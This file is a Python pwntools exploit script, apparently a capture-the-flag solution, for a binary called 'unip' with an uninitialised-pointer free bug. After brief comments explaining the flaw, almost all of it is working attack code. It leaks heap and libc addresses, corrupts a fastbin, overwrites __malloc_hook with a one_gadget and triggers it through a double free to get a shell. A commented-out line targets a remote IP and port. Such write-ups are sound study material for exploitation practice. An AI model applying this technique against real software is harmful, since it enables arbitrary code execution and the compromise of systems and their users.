# vulnerability?
# function is called to get huge user input. Then stack frame is destroyed and new stack frame is created for delete(), which frees a chunk. This function gets an index from the user, then runs a loop to check if the index we provided is in between 0 and 9(inclusively), and then gets the heap chunk pointer into a local variable based on the index, and free is called.
# free() is called no matter what, even if the index given is out of bound(but the ptr is initialised only if the index is correct). So if index is out of bound the argument to free will be whatever the local variable has in it. Which can also be content of the previous stack frame. 
# Hence we are able to pass any pointer of choice as argument to free(), thus leading to a UAF.
from pwn import *
s=process('./unip',env={'LD_PRELOAD' : './libc.so.6'})
#s=remote("18.224.57.15",1337)
libc=ELF('./libc.so.6')

def add(size):
    s.sendlineafter(">>> ",str(1))
    s.sendlineafter("Enter password\n",p64(0x00)*(0x3ff/8))
    s.sendlineafter("Enter size",str(size))
    if(size != 0):
        s.sendlineafter("Enter data: ","aaaa")

def edit(idx,content):
    s.sendlineafter(">>> ",str(2))
    s.sendlineafter("Enter password",p64(0x00)*(0x3ff/8))
    s.sendlineafter("Enter index",str(idx))
    s.send(content)


def free(idx,word):
    s.sendlineafter(">>> ",str(3))
    s.sendlineafter("Enter password",word)
    s.sendlineafter("Enter index",str(idx))

def view(idx):
    s.sendlineafter(">>> ",str(4))
    s.sendlineafter("Enter password",p64(0x00)*(0x3ff/8))
    s.sendlineafter("Enter index",str(idx))


word="a"*8
add(0)
add(0)
add(0)
add(0)
free(0,"a")
free(1,"a")
free(2,"a")
add(0)
view(0) 
s.recvuntil('\n')
heap_leak=u64(s.recvline()[:-1].ljust(8,"\x00"))
heap_base=heap_leak-0x20
print "HEAP_BASE = " + str(hex(heap_base))

# freeing fake chunk small bin chunk to get libc leak
add(96)
add(0x70)
add(0x70)
edit(1,p64(0x00) + p64(0xe1)) # size faked such that (ptr+size->size) is set
fake1=heap_base+0xa0
free(20,p64(fake1)*127) # spraying stack with pointer to free 
edit(1,"a"*16) 
view(1)
s.recvuntil('\n')
s.recvuntil('a'*16)
leak=u64(s.recvline()[:-1].ljust(8,"\x00"))
libc_base=leak-0x3c4b78
log.success("LIBC_BASE = " + hex(libc_base))

one_gadget=libc_base+0xf0274
malloc_hook=libc_base+libc.symbols['__malloc_hook']
system=libc_base + libc.symbols['system']

free(20,p64(fake1-0x10)*127)
edit(1,p64(malloc_hook - 0x23))  # fastbin corruption to control __malloc_hook
add(96)
add(96)
edit(6,"a"*(0x23-16)+ p64(one_gadget)) # overwriting __malloc_hook with one_gadget 
log.success("DONE")
free(20,p64(fake1-0x10)*127)
free(20,p64(fake1-0x10)*127) # executing one_gadget by invoking malloc() with a double free.


s.interactive()
#gdb.attach(s)
